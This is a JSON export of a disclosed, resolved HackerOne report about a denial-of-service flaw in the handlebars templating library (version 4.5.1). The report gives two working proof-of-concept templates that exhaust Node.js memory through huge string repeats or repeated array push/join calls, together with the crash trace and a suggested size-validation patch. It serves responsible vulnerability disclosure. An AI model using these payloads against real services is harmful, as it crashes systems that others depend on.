{
  "id": 726364,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MjYzNjQ=",
  "url": "https://hackerone.com/reports/726364",
  "title": "Crash Node.js process from handlebars using a small and simple source",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-10-31T13:23:37.637Z",
  "submitted_at": "2019-10-31T13:23:37.637Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "macasun",
    "url": "/macasun",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-04-27T22:13:11.436Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2020-04-27T22:08:54.341Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report Denial of service in handlebars.\nIt allows an attacker to crush Node.js process with a small and simple source.\n\n# Module\n\n**module name:** handlebars\n**version:** 4.5.1\n**npm page:** `https://www.npmjs.com/package/handlebars`\n\n## Module Description\n\nHandlebars.js is an extension to the Mustache templating language created by Chris Wanstrath. Handlebars.js and Mustache are both logicless templating languages that keep the view and the code separated like we all know they should be.\n\n## Module Stats\n\n9,223,382 downloads/week\n\n# Vulnerability\n\n## Vulnerability Description\n\nBy default Node.js limiting the max heap size to 700 MB or 1400MB on 32 and 64-bit platforms respectively. When the process consumes all available memory, it crashes. Handlebars doesn't validate the size of the context, so it's possible to create a very big string (using `String#repeat`) or a very big array (using `Array.push`), and concatenate a string or join an array to crash Node.js process. In theory, this exploit will crash node.js process that was started with increased memory limit: `--max-old-space-size=<memory-size>`. \n\n## Steps To Reproduce:\n\nThere are three possible variants of the exploit:\n1. Generate a big string (500Mb) and call `String#concat` on it (the payload size is 124b).\n2. Declare a small string (100b), convert it to array using `String#split` and call thousands of `Array#push/Array#join` (the payload is 88Kb).\n3. Declare a medium size string (10Kb), convert it to array using `String#split` and call hundreds of `Array#push/Array#join` (the payload is 18Kb).\n\n1. The exploit doesn't require input context, it creates everything inside the source.\n2. Create a big size string using `String#repeat`.\n3. Concatenate string with itself.\n4. Compile and run template.\n5. Process crashed.\n\nVariant #1. Generate a big string (500Mb) and call `String#concat` on it:\n```\nconst handlebars = require('handlebars');\n\nlet source = `\n{{#with 'a' as |s0|}}\n  {{#with (s0.repeat 500000000) as |s|}}\n    {{s.concat s}}\n    {{s.concat s}}\n  {{/with}}\n{{/with}}\n`;\n\nlet template = handlebars.compile(source);\ntemplate();\n```\n\nVariant #2. Declare a small string (100b), convert it to array using `String#split` and call thousands of `Array#push/Array#join`:\n```\nconst handlebars = require('handlebars');\n\nlet sourceHeader = `\n{{#with 'ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss' as |s|}}\n  {{#with s.split as |a|}}\n`;\nlet sourceFooter = `\n  {{/with}}\n{{/with}}\n`;\nlet sourceBody = '{{a.push s}}{{a.join}}'.repeat(10 ** 3 * 4);\nlet payload = sourceHeader + sourceBody + sourceFooter;\n\nlet template = handlebars.compile(payload);\ntemplate();\n```\n\nIn both cases Node.js process crashes:\n```\n<--- Last few GCs --->\n\n[11741:0x32299b0]     3929 ms: Mark-sweep 1245.6 (1426.4) -> 1245.6 (1425.4) MB, 33.7 / 0.0 ms  (average mu = 0.685, current mu = 0.001) last resort GC in old space requested\n[11741:0x32299b0]     3963 ms: Mark-sweep 1245.6 (1425.4) -> 1245.6 (1425.4) MB, 34.4 / 0.0 ms  (average mu = 0.501, current mu = 0.001) last resort GC in old space requested\n\n<--- JS stacktrace --->\n\n==== JS stack trace =========================================\n\n    0: ExitFrame [pc: 0xc1315dbe1d]\nSecurity context: 0x2eee53b9e6e1 <JSObject>\n    1: DoJoin(aka DoJoin) [0x2eee53b85e89] [native array.js:~87] [pc=0xc131892da0](this=0x2b1e3fd026f1 <undefined>,l=0x0378b7e7e3e9 <JSArray[6647]>,m=6647,A=0x2b1e3fd028c9 <true>,w=0x2eee53bdc0d9 <String[1]: ,>,v=0x2b1e3fd029a1 <false>)\n    2: Join(aka Join) [0x2eee53b85ed9] [native array.js:1] [bytecode=0xc562a657d09 offset=71](this=0x2b1e3fd026f1 <undefined>...\n\nFATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory\n 1: 0x8dc1c0 node::Abort() [node]\n 2: 0x8dc20c  [node]\n 3: 0xad60ae v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, bool) [node]\n 4: 0xad62e4 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, bool) [node]\n 5: 0xec3972  [node]\n 6: 0xed318f v8::internal::Heap::AllocateRawWithRetryOrFail(int, v8::internal::AllocationSpace, v8::internal::AllocationAlignment) [node]\n 7: 0xea2d3b v8::internal::Factory::NewRawTwoByteString(int, v8::internal::PretenureFlag) [node]\n 8: 0x1191338 v8::internal::Runtime_StringBuilderJoin(int, v8::internal::Object**, v8::internal::Isolate*) [node]\n 9: 0xc1315dbe1d \nAborted (core dumped\n```\n\n## Patch\n\nValidate the size of the context before calling any of its functions.\n1. If context is a string, validate that its length doesn't exceed some logical value (100Kb for example).\n2. If context is an array, validate that its size doesn't exceed some logical value (500 elements for example) and sum of all element's values less than logical value (10Kb for example).\n\n## Supporting Material/References:\n\n- Ubuntu 18.04.3\n- node 10.15.1\n- npm 6.4.1\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\nBest regards,\nAlexander\n\n## Impact\n\nAn attacker is able to crash Node.js process.",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2020-05-27T22:08:54.442Z",
  "allow_singular_disclosure_after": -117213708.48113003,
  "singular_disclosure_allowed": true,
  "vote_count": 0,
  "voters": [],
  "severity": {
    "rating": "medium",
    "score": 6.5,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 24624,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "handlebars",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
